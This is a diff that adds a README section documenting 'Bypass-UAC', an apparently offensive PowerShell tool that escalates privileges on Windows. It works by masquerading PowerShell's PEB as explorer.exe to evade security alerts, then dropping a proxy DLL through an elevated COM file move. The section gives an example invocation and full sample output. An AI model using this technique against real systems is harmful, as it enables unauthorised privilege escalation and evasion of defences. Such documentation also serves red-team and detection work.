@@ -117,6 +117,35 @@ LUID Privilege
 
 ## pwnd
 
+### Bypass-UAC
+
+Bypass-UAC provides a framework to perform UAC bypasses based on auto elevating IFileOperation COM object method calls. This is not a new technique, traditionally, this is accomplished by injecting a DLL into “explorer.exe”. This is not desirable because injecting into explorer may trigger security alerts and working with unmanaged DLL’s makes for an inflexible work-flow.
+
+To get around this, Bypass-UAC implements a function which rewrites PowerShell’s PEB to give it the appearance of “explorer.exe”. This provides the same effect because COM objects exclusively rely on Windows’s Process Status API (PSAPI) which reads the process PEB.
+
+```
+C:\PS> Bypass-UAC -Method ucmDismMethod
+
+[!] Impersonating explorer.exe!
+[+] PebBaseAddress: 0x000007F73E93F000
+[!] RtlEnterCriticalSection --> &Peb->FastPebLock
+[>] Overwriting &Peb->ProcessParameters.ImagePathName: 0x000000569B5F1780
+[>] Overwriting &Peb->ProcessParameters.CommandLine: 0x000000569B5F1790
+[?] Traversing &Peb->Ldr->InLoadOrderModuleList doubly linked list
+[>] Overwriting _LDR_DATA_TABLE_ENTRY.FullDllName: 0x000000569B5F2208
+[>] Overwriting _LDR_DATA_TABLE_ENTRY.BaseDllName: 0x000000569B5F2218
+[!] RtlLeaveCriticalSection --> &Peb->FastPebLock
+
+[>] Dropping proxy dll..
+[+] 64-bit Yamabiko: C:\Users\b33f\AppData\Local\Temp\yam1730961377.tmp
+[>] Creating XML trigger: C:\Users\b33f\AppData\Local\Temp\pac500602004.xml
+[>] Performing elevated IFileOperation::MoveItem operation..
+
+[?] Executing PkgMgr..
+[!] UAC artifact: C:\Windows\System32\dismcore.dll
+[!] UAC artifact: C:\Users\b33f\AppData\Local\Temp\pac500602004.xml
+```
+
 ### Masquerade-PEB
 
 Masquerade-PEB uses NtQueryInformationProcess to get a handle to powershell's PEB. From there it replaces a number of UNICODE_STRING structs in memory to give powershell the appearance of a different process. Specifically, the function will overwrite powershell's "ImagePathName" & "CommandLine" in _RTL_USER_PROCESS_PARAMETERS and the "FullDllName" & "BaseDllName" in the _LDR_DATA_TABLE_ENTRY linked list.
